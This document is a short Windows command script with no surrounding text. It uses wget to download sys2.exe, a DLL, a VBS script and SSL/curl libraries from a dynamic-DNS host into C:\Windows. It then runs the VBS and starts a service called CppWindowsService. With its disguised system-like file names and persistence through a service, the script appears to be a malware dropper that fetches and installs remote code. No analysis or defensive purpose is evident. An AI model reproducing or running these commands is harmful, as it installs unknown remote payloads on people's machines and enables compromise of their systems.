wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\sys2.dll
wget http://troglo.homepc.it/win/sys2.vbs -O c:\windows\sys2.vbs
wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
wget http://troglo.homepc.it/win/libcurl.dll -O c:\windows\libcurl.dll
wget http://troglo.homepc.it/win/libcrypto-1_1.dll -O c:\windows\libcrypto-1_1.dll
cscript c:\windows\sys2.vbs
net start CppWindowsService
 